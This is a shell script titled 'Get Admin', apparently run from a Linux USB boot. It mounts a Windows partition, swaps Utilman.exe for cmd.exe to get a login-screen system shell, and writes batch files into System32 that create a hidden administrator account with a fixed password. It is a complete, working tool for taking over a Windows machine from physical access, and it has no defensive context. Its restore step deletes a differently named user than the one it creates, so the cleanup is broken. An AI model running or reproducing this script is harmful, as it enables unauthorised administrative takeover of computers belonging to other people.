#!/bin/sh

apk add --force-non-repository /media/usb/apks/x86_64/ntfs-3g-libs-2022.10.3-r3.apk
apk add --force-non-repository /media/usb/apks/x86_64/ntfs-3g-2022.10.3-r3.apk

clear
echo ""
echo ""
echo ""
echo "    ██▄   ██      ▄       ██   ██▄   █▀▄▀█ ▄█    ▄    "
echo "    █  █  █ █      █      █ █  █  █  █ █ █ ██     █   "
echo "    █   █ █▄▄█ ██   █     █▄▄█ █   █ █ ▄ █ ██ ██   █  "
echo "    █  █  █  █ █ █  █     █  █ █  █  █   █ ▐█ █ █  █  "
echo "    ███▀     █ █  █ █        █ ███▀     █   ▐ █  █ █  "
echo "            █  █   ██       █          ▀      █   ██  "
echo "           ▀               ▀                          "
echo ""
echo ""
echo "  - Get Admin - by Dan_Frxg  "
echo ""
echo ""
fdisk -l

# User input for partition
echo ""
echo ""
echo "  > Enter partition [ named: basic data partition, usually: /dev/sda3 ]: "
read partition

# Check if partition exists
if [ ! -b "$partition" ]; then
    echo "Partition does not exist. Exiting..."
    exit 1
fi

# Mount partition
echo ""
echo "  - Mounting partition..."
mkdir -p /mnt
mount -t ntfs-3g $partition /mnt || { echo "Failed to mount partition"; exit 1; }

# Backup and replace Utilman.exe
echo ""
echo "  - Backing up and replacing Utilman.exe..."
cp /mnt/Windows/System32/Utilman.exe /mnt/Windows/System32/Utilman.exe.bak
cp /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe

# Add restore.bat to System32
echo ""
echo "  - Adding restore.bat to System32..."
cat > /mnt/Windows/System32/restore.bat << EOF
@echo off
start cmd.exe /c "timeout 3 & net user Admin /delete & del /f restore.bat & del /f add-user.bat & del /f remove-user.bat & copy Utilman.exe.bak Utilman.exe /y & echo Finished restoring Utilman.exe and deleted scripts! & timeout 5" & exit
EOF

# Add add-user.bat to System32
echo ""
echo "  - Adding add-user.bat to System32..."
cat > /mnt/Windows/System32/add-user.bat << EOF
@echo off
net user Backup P4ssw.rd! /add
net localgroup administrators Backup /add
echo Finished creating Admin user!
EOF

# Add remove-user.bat to System32
# echo ""
# echo "  - Adding remove-user.bat to System32..."
# cat > /mnt/Windows/System32/remove-user.bat << EOF
# @echo off
# net user Administrator /delete
# echo Finished removing Admin user!
# EOF

# Unmount partition
echo ""
echo "  - Unmounting partition..."
umount $partition || { echo "Failed to unmount partition"; exit 1; }

# Done message
echo ""
echo "  - Done!"
echo ""
